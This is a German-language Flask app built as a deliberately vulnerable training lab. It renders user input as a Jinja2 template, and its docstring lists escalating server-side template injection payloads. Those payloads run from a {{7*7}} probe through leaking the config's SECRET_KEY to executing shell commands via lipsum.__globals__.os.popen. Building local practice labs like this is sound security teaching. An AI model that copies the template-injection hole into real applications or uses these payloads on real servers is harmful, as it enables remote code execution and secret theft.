"""Uebungs-Ziel: Server-Side Template Injection (SSTI) -> RCE.

BEWUSST VERWUNDBAR. Die "Visitenkarten"-Funktion baut deinen Namen direkt in
einen Jinja2-Template-STRING und rendert ihn (render_template_string auf
Nutzereingabe). Jinja wertet damit {{ ... }} serverseitig aus -> von 7*7 bis
zur Shell.

Start (nur lokal / eigene Instanz):

    pip install flask
    python app.py                 # http://127.0.0.1:5003

Loesung (eskalierend):
    {{7*7}}                                           -> 49  (Beweis)
    {{ config }}                                      -> Flask-Config (SECRET_KEY!)
    {{ lipsum.__globals__.os.popen('whoami').read() }}  -> Befehl ausgefuehrt

GRENZE: Nur gegen diese eigene Uebungs-Instanz.
"""
import os

from flask import Flask, render_template_string, request

app = Flask(__name__)
app.config["LAB_FLAG"] = "WS2026{ssti_rce}"   # "Geheimnis", das per SSTI leakt

HEAD = """<!doctype html>
<title>Visitenkarten-Generator (SSTI-Lab)</title>
<style>
 body{font-family:Georgia,serif;max-width:680px;margin:2rem auto;padding:0 1rem;
      background:#f4ecd8;color:#2b2119}
 .warn{background:#7c2d12;color:#fde68a;padding:.6rem .9rem;border-radius:6px;font-size:.9rem}
 input,button{padding:.5rem;font-size:1rem}
 button{background:#92400e;color:#fde68a;border:0;border-radius:6px;cursor:pointer}
 .card{background:#fffbf0;border:1px solid #d6c7a1;border-radius:8px;padding:1rem;margin:1rem 0}
 .muted{color:#6b5b45;font-size:.85rem}
</style>
<p class="warn">UEBUNGS-LAB &mdash; bewusst verwundbar (SSTI). Nur lokal/autorisiert.</p>
<h1>&#9876; Visitenkarten-Generator</h1>
<form method="get">
  <label>Dein Name: <input name="name" value=""></label>
  <button type="submit">Karte erzeugen</button>
</form>
"""


@app.route("/")
def index():
    name = request.args.get("name", "")
    card = ""
    if name:
        # DIE LUECKE: Nutzereingabe wird als Jinja-Template gerendert.
        tmpl = ("<div class='card'><h2>Hallo, " + name +
                "!</h2><p class='muted'>Willkommen im Saloon.</p></div>")
        try:
            card = render_template_string(tmpl)
        except Exception as exc:  # Fehler hilft beim Ausprobieren
            card = f"<div class='card'>Template-Fehler: {exc}</div>"
    hint = ("<p class='muted'>Tipp: Gib deinen Namen oben ein. Was passiert bei "
            "<code>{{7*7}}</code>?</p>")
    return HEAD + card + hint


if __name__ == "__main__":
    host = os.environ.get("HOST", "127.0.0.1")
    port = int(os.environ.get("PORT", "5003"))
    print("[!] UEBUNGS-LAB: SSTI -> RCE - nur lokal/autorisiert.")
    print(f"[i] Start auf http://{host}:{port}  (Ziel: Befehl ausfuehren via {{{{...}}}})")
    app.run(host=host, port=port, debug=False)
